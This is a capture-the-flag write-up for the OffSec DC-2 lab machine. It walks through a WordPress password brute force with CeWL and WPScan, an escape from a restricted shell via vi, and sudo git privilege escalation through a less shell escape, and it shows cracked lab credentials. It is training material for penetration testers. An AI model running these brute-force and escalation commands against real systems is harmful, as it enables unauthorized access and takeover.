
# OffSec DC-2

## Overview

**DC-2** is a beginner-to-intermediate CTF machine that tests WordPress enumeration, custom wordlist generation, SSH restricted shell escape, and sudo privilege escalation via `git`. The attack chain progresses through five flags, each providing a hint toward the next stage.

| Detail | Value |
|---|---|
| **Target IP** | `192.168.195.194` |
| **Hostname** | `dc-2` |
| **Open Ports** | 80 (HTTP — Apache 2.4.10), 7744 (SSH — OpenSSH 6.7p1) |
| **CMS** | WordPress 4.7.10 |
| **OS** | Debian GNU/Linux |

### Attack Chain Summary

```
Nmap Scan → WordPress Enumeration (WPScan)
         → Custom Wordlist (CeWL) → Credential Brute Force
         → WordPress Login (Flag 1 & 2)
         → SSH as tom (port 7744)
         → rbash Escape via vi
         → su to jerry → sudo git → Root Shell (Flag 3, 4, Final)
```

## Phase 3 — Credential Brute Force

### 3.1 Custom Wordlist with CeWL

Following Flag 1's hint, used **CeWL** (Custom Word List Generator) to scrape the website and build a site-specific password list:

```
cewl http://dc-2/ -w passwords.txt
```

CeWL reads the target website's content and extracts all unique words into a wordlist file. This is effective because users often choose passwords based on words found on their own sites.

### 3.2 Username File

Created `user.txt` with the three enumerated usernames:

```
admin
tom
jerry
```

### 3.3 WPScan Password Attack

Launched a brute-force attack against the WordPress login using the custom wordlist:

```
wpscan --url http://dc-2/ -U user.txt -P passwords.txt --password-attack wp-login
```

| Flag | Meaning |
|---|---|
| `-U user.txt` | File containing usernames to test |
| `-P passwords.txt` | File containing passwords to test |
| `--password-attack wp-login` | Attack via the standard `wp-login.php` form |

**Results — two valid credential pairs found:**

```
[SUCCESS] - jerry / adipiscing
[SUCCESS] - tom   / parturient
```

> [!NOTE]
> The `admin` password was not cracked with this wordlist. Flag 1 warned: *"sometimes you just can't win them all"* — not all users will be crackable.

### 5.2 Restricted Shell Discovery

Immediately hit a wall — basic commands don't work:

```

flag3.txt  local.txt  usr
tom@DC-2:~$ cat flag3.txt

```

The shell is **`rbash`** (Restricted Bash), which limits the PATH and blocks most commands.

Confirmed the restricted environment:

Only four commands available: `less`, `ls`, `scp`, and **`vi`** — the last one is the escape vector.

### 5.3 Escaping rbash via vi

**`vi`** can spawn a shell through its `:shell` command. Since `vi` itself is allowed, it can be used to break out of the restricted environment.

**Step 1** — Open vi:

```
tom@DC-2:~$ vi
```

![](../../attachments/Pasted%20image%2020260717204733.png)

**Step 2** — Inside vi, set the shell to `/bin/bash` and spawn it:

```
:set shell=/bin/bash
:shell
:q
```

This tells vi to use `/bin/bash` instead of the default `rbash` when spawning a sub-shell. The `:shell` command then launches that bash instance.

```
rbash
   │
   ▼
 Vim
   │
   ▼
 bash  ← unrestricted!
```

**Step 3** — Fix the PATH so standard commands are available:

```
export PATH=/bin:/usr/bin:$PATH
export SHELL=/bin/bash
```

Without fixing PATH, the new bash shell would still inherit the restricted `PATH=/home/tom/usr/bin` and commands like `cat`, `find`, `python` would remain invisible.

**Jerry can run `/usr/bin/git` as root without a password.** This is a known privilege escalation vector documented on [GTFOBins](https://gtfobins.github.io/gtfobins/git/).

### 6.3 GTFOBins — git Sudo Exploit

Consulted GTFOBins for the `git` sudo escalation technique:

![](../../attachments/Pasted%20image%2020260717210353.png)

![](../../attachments/Pasted%20image%2020260717211021.png)

The technique exploits the fact that `git --help` opens documentation in the **`less`** pager. Since the entire `git` process runs as root via `sudo`, the `less` pager also inherits root privileges — and `less` supports shell escapes via the `!` command.

**Exploitation chain:**

```
sudo (root)
     │
     ▼
git branch --help
     │
     ▼
less (pager, running as root)
     │
     ▼
!/bin/sh
     │
     ▼
Root Shell
```

**Step 1** — Run git help as root:

```
jerry@DC-2:/home/tom$ sudo git branch --help config
```

**Step 2** — Inside the `less` pager, type `!/bin/sh` and press Enter:

![](../../attachments/Pasted%20image%2020260717212103.png)

```
!/bin/sh
```

The `!` prefix in `less` means "execute an external command." Since `less` is running as root, the spawned `/bin/sh` shell inherits root privileges.

`less` is not a shell, but it has a built-in feature to launch external commands.`less` is not a shell, but it has a built-in feature to launch external commands.

## Lessons Learned

1. **Always add hostnames to `/etc/hosts`** — Nmap's redirect detection (`Did not follow redirect to http://dc-2/`) is a clear signal that hostname resolution is required.

2. **Read the flags carefully** — Each flag in DC-2 is a breadcrumb. Flag 1 literally name-drops `cewl`. Flag 2 says "another entry point." Flag 3 hints at `su`. Ignoring hints wastes time.

3. **Custom wordlists beat generic ones** — `rockyou.txt` would not have cracked these passwords. CeWL generates wordlists from the target itself, which is especially effective when admins use site-related terms as passwords.

4. **`rbash` is not a dead end** — Restricted shells limit PATH and command execution, but any allowed program that can spawn a sub-shell (vi, less, python, awk, etc.) is a potential escape vector. Always enumerate available commands with `ls -la` on the restricted PATH directory.

5. **GTFOBins is essential** — When `sudo -l` reveals a binary that can be run as root, GTFOBins should be the first reference. The `git → less → !/bin/sh` chain is a classic pager-based privilege escalation.

6. **Non-standard SSH ports** — Always scan all 65535 ports (`-p-`). SSH on port 7744 would be missed with a default top-1000 scan.
